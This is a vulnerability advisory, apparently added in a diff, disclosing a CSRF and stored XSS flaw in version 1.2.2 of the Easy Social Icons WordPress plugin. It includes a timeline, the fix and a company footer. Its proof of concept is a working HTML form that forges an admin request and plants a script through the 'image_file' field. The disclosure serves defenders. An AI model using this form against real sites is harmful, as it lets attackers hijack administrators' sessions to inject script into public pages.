@@ -1,0 +1,63 @@
+====================================================
+Product: Easy Social Icons WordPress plugin
+Vendor: CyberNetikz
+Tested Version: 1.2.2
+Vulnerability Type: XSS [CWE-79] and CSRF [CWE-352]
+Risk Level: Medium
+Solution Status: Solved in version 1.2.3
+Discovered and Provided: Eric Flokstra - ITsec Security Services
+====================================================
+[-] About the Vendor:
+
+Easy Social Icons is a WordPress plugin and can be used to set icons on the public page in order to link to social media platforms such as LinkedIn, Twitter or Facebook.
+
+[-] Advisory Details:
+
+It is discovered that insufficient validation is performed on the 'image_file' parameter enabling arbitrary JavaScript to be injected. On top of that no random tokens are used to prevent CSRF attacks. By combining these vulnerabilities an attacker could for example trick an admin into setting a persistent XSS payload on the public WordPress page.
+
+[-] Proof of Concept:
+
+<html>
+ <body>
+   <form action="http://10.0.2.215/wordpress/wp-admin/admin.php?page=cnss_social_icon_add&mode=edit&id=1" <http://10.0.2.215/wordpress/wp-admin/admin.php?page=cnss_social_icon_add&mode=edit&id=1> method="POST" enctype="multipart/form-data">
+     <input type="hidden" name="title" value="Example" />
+     <input type="hidden" name="image&#95;file" value="http&#58;&#47;&#47;10&#46;0&#46;2&#46;215&#47;wordpress&#47;wp&#45;content&#47;uploads&#47;2015&#47;02&#47;cookie&#46;jpg"><script>alert&#40;1&#41;<&#47;script>" />
+     <input type="hidden" name="url" value="http&#58;&#47;&#47;www&#46;example&#46;org" />
+     <input type="hidden" name="sortorder" value="0" />
+     <input type="hidden" name="target" value="1" />
+     <input type="hidden" name="action" value="edit" />
+     <input type="hidden" name="id" value="1" />
+     <input type="hidden" name="submit&#95;button" value="Save&#32;Changes" />
+     <input type="submit" value="Submit request" />
+   </form>
+ </body>
+</html>
+
+[-] Disclosure Timeline:
+
+[02 Feb 2015]: Vendor notification
+[02 Feb 2015]: Vulnerability confirmation
+[11 Feb 2015]: Vulnerability patched
+[19 Feb 2015]: Public disclosure
+
+[-] Solution:
+
+Update to the latest version of Easy Social Icons.
+
+[-] References:
+
+[1] Easy Social Icons Changelog -- https://wordpress.org/plugins/easy-social-icons/changelog/
+[2] Common Weakness Enumeration (CWE) -- http://cwe.mitre.org
+[3] ITsec Security Services BV -- http://www.itsec.nl
+
+------------------------------------------------------------------------
+ITsec Security Services bv. (KvK. 34181927)
+
+Postal Address:
+P.O. Box 5120, 2000GC Haarlem
+Visitors Address:	
+Kenaupark 23, 2011 MR Haarlem
+
+Phone:			+31 - (0)23 542 05 78
+
+The information contained in this email communication is confidential and is intended solely for the use of the individual or entity to whom it is addressed and others authorized to receive it. If you are not the intended recipient, you are hereby notified that any disclosure, copying,distribution, or taking any action in reliance of the contents of this information is strictly prohibited and may be unlawful. No rights may be attached to this message. ITsec does not accept any liability for incorrect and incomplete transmission or delayed receipt of this e-mail nor for the effects or damages caused by the direct or indirect use of the information or functionality provided by this posting, nor the content contained within.Use them at your own risk.
